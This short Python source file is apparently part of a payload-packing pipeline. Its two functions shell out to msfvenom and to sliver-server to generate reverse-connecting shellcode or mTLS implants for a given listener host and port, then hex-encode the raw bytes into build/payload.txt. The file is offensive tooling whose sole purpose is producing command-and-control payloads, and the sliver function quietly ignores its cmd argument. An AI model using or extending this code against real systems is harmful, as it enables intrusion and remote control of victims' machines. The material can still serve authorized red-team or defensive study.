import subprocess

# Function to generate a payload using msfvenom and save bytes of the payload in a file
def msfvenom(payload, rhost, rport, ruri, cmd):
    print(f"Generating payload :")
    RURI_part = f" LURI={ruri}" if ruri else ""
    CMD_part = f" CMD={cmd}" if cmd else ""
    if ruri and cmd:
        raise ValueError("Cannot specify both RURI and CMD")
    command = f"msfvenom -p {payload} LHOST={rhost} LPORT={rport} {RURI_part} {CMD_part} -f raw | xxd -p | tr -d '\\n' > build/payload.txt"
    print(command)
    subprocess.run(command, shell=True, check=True)

def sliver(payload, lhost, lport, uri, cmd):
    print(f"Generating payload :")
    URI_part = f" --http-uri {uri}" if uri else ""
    CMD_part = f" CMD={cmd}" if cmd else ""
    command = f"sliver-server generate --mtls --lhost {lhost} --lport {lport} {URI_part} --format raw | xxd -p | tr -d '\\n' > build/payload.txt"
    print(command)
    subprocess.run(command, shell=True, check=True)